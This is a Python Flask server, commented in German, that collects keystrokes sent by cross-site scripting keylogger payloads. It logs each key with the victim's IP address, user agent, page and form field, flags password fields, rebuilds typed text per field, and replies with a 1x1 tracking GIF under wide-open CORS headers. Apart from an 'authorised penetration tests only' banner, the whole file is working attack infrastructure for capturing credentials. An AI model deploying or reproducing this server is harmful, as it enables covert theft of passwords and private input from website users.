#!/usr/bin/env python3
"""
XSS Keylogger Server
Empfängt und loggt Tastatureingaben von XSS-Keylogger-Payloads

⚠️ WICHTIG: Nur für autorisierte Penetrationstests verwenden!
          Keystroke-Logging ist hochgradig invasiv!
"""

import json
import os
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, Response
from urllib.parse import unquote

class KeyloggerServer:
    def __init__(self, config_path="config.json"):
        self.config = self.load_config(config_path)
        self.app = Flask(__name__)
        self.keystroke_sessions = {}
        self.all_keystrokes = []
        self.total_keystrokes = 0
        self.setup_routes()

    def load_config(self, config_path):
        """Lädt Konfiguration aus JSON-Datei"""
        config_file = Path(__file__).parent / config_path
        with open(config_file, 'r', encoding='utf-8') as f:
            return json.load(f)

    def setup_routes(self):
        """Richtet Flask-Routes ein"""

        @self.app.route('/log', methods=['POST', 'GET', 'OPTIONS'])
        def log_keystroke():
            """Empfängt Keystrokes via POST oder GET"""

            # Handle CORS preflight
            if request.method == 'OPTIONS':
                return self.create_tracking_pixel_response()

            # Extract keystroke data
            keystroke_data = None

            if request.method == 'POST':
                # Try JSON first
                if request.is_json:
                    data = request.get_json()

                    # Handle batch of keystrokes
                    if 'keystrokes' in data and isinstance(data['keystrokes'], list):
                        session_id = data.get('sid', 'default')
                        for ks in data['keystrokes']:
                            self.process_single_keystroke(
                                key=ks.get('key', ''),
                                field=ks.get('field', 'unknown'),
                                page=data.get('page', ''),
                                session_id=session_id
                            )
                        return self.create_tracking_pixel_response()

                    # Single keystroke in JSON
                    keystroke_data = {
                        "key": data.get('key', ''),
                        "field": data.get('field', 'unknown'),
                        "page": data.get('page', ''),
                        "session_id": data.get('sid', 'default')
                    }
                else:
                    # Form data
                    keystroke_data = {
                        "key": request.form.get('key', ''),
                        "field": request.form.get('field', 'unknown'),
                        "page": request.form.get('page', ''),
                        "session_id": request.form.get('sid', 'default')
                    }
            else:  # GET request
                keystroke_data = {
                    "key": request.args.get('key', ''),
                    "field": request.args.get('field', 'unknown'),
                    "page": request.args.get('page', ''),
                    "session_id": request.args.get('sid', 'default')
                }

            if keystroke_data:
                self.process_single_keystroke(**keystroke_data)

            # Return 1x1 GIF instead of JSON (prevents browser errors)
            return self.create_tracking_pixel_response()

        @self.app.route('/status')
        def status():
            """Status-Endpoint zum Überprüfen des Servers"""
            return jsonify({
                "status": "running",
                "total_keystrokes": self.total_keystrokes,
                "sessions": len(self.keystroke_sessions),
                "server": "XSS Keylogger"
            })

    def process_single_keystroke(self, key, field, page, session_id):
        """Verarbeitet einen einzelnen Keystroke"""
        keystroke_entry = {
            "timestamp": datetime.now().isoformat(),
            "key": key,
            "field": field,
            "page": page,
            "ip": request.remote_addr,
            "user_agent": request.headers.get('User-Agent'),
            "session_id": session_id
        }

        # Session-Gruppierung
        if session_id not in self.keystroke_sessions:
            self.keystroke_sessions[session_id] = {
                "start_time": keystroke_entry["timestamp"],
                "keystrokes": []
            }

        self.keystroke_sessions[session_id]["keystrokes"].append(keystroke_entry)
        self.all_keystrokes.append(keystroke_entry)
        self.total_keystrokes += 1

        # Real-time logging
        self.log_keystroke_console(keystroke_entry)
        self.log_keystroke_file(keystroke_entry)

        # Auto-save nach batch_size
        batch_size = self.config['keylogger_server'].get('batch_size', 10)
        if self.total_keystrokes % batch_size == 0:
            self.save_keystrokes()

    def log_keystroke_console(self, keystroke_entry):
        """Gibt Keystroke in Echtzeit auf Console aus"""
        key = keystroke_entry['key']
        field = keystroke_entry['field']

        # Highlight password fields
        if 'password' in field.lower():
            print(f"🔑 [{field:15}] {key}", end='', flush=True)
        else:
            print(f"⌨️  [{field:15}] {key}", end='', flush=True)

    def log_keystroke_file(self, keystroke_entry):
        """Schreibt Keystroke in TXT-Log-Datei"""
        log_file = Path(__file__).parent / self.config['keylogger_server']['log_file']
        log_file.parent.mkdir(parents=True, exist_ok=True)

        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f"{keystroke_entry['timestamp']} | "
                   f"{keystroke_entry['field']:15} | "
                   f"{keystroke_entry['key']}\n")

    def save_keystrokes(self):
        """Speichert alle Keystrokes in JSON-Datei"""
        output_file = Path(__file__).parent / self.config['keylogger_server']['keystrokes_output']
        output_file.parent.mkdir(parents=True, exist_ok=True)

        # Reconstruct input by field for preview
        reconstructed_preview = self.reconstruct_by_field_preview()

        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump({
                "metadata": {
                    "server": "KeyloggerServer",
                    "timestamp": datetime.now().isoformat(),
                    "version": "1.0"
                },
                "sessions": self.keystroke_sessions,
                "all_keystrokes": self.all_keystrokes,
                "reconstructed_preview": reconstructed_preview,
                "statistics": {
                    "total_keystrokes": self.total_keystrokes,
                    "total_sessions": len(self.keystroke_sessions),
                    "unique_ips": len(set(k['ip'] for k in self.all_keystrokes)),
                    "fields_logged": list(set(k['field'] for k in self.all_keystrokes))
                }
            }, f, indent=2, ensure_ascii=False)

    def reconstruct_by_field_preview(self):
        """Rekonstruiert getippten Text pro Feld (für JSON-Preview)"""
        from collections import defaultdict
        reconstructed = defaultdict(str)

        for ks in self.all_keystrokes:
            field = ks['field']
            key = ks['key']

            # Handle special keys
            if key == 'Backspace':
                if len(reconstructed[field]) > 0:
                    reconstructed[field] = reconstructed[field][:-1]
            elif key == 'Enter':
                reconstructed[field] += '\\n'
            elif key == 'Tab':
                reconstructed[field] += '\\t'
            elif len(key) == 1:  # Regular character
                reconstructed[field] += key

        return dict(reconstructed)

    def create_tracking_pixel_response(self):
        """Erstellt 1x1 transparentes GIF als Response (wie Cookie-Stealer)"""
        # 1x1 transparent GIF (43 bytes)
        gif_data = (
            b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00'
            b'\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00'
            b'\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02'
            b'\x44\x01\x00\x3b'
        )

        response = Response(gif_data, mimetype='image/gif')
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = '*'
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        return response

    def create_cors_response(self, data=None):
        """Erstellt Response mit CORS-Headers"""
        if data is None:
            data = {"status": "ok"}

        response = jsonify(data)
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, X-Requested-With'
        response.headers['Access-Control-Max-Age'] = '3600'
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        return response

    def run(self):
        """Startet den Keylogger Server"""
        host = self.config['keylogger_server']['host']
        port = self.config['keylogger_server']['port']

        print("\n" + "="*80)
        print(" XSS KEYLOGGER SERVER")
        print("="*80)
        print(f"Server gestartet auf: http://{host}:{port}/log")
        print(f"Status-Endpoint:      http://{host}:{port}/status")
        print(f"\n️  WICHTIG: Nur für autorisierte Penetrationstests verwenden!")
        print(f"  Keystroke-Logging ist hochgradig invasiv!")
        print(f"\nWarte auf Keystrokes...")
        print(f"{'='*80}")
        print(f"\nLEGENDE: T  = Normal | P = Password-Feld")
        print(f"{'-'*80}\n")

        # Threaded=True für bessere Fehlerbehandlung
        # use_reloader=False verhindert doppelte Server-Instanzen
        self.app.run(host=host, port=port, debug=False, threaded=True, use_reloader=False)


if __name__ == "__main__":
    try:
        server = KeyloggerServer()
        server.run()
    except KeyboardInterrupt:
        print("\n\n[*] Server beendet.")
        print("[*] Keystrokes wurden gespeichert.")
    except Exception as e:
        print(f"\n[!] Fehler: {e}")
        print("[*] Stelle sicher, dass config.json vorhanden ist und Port 8889 verfügbar ist.")
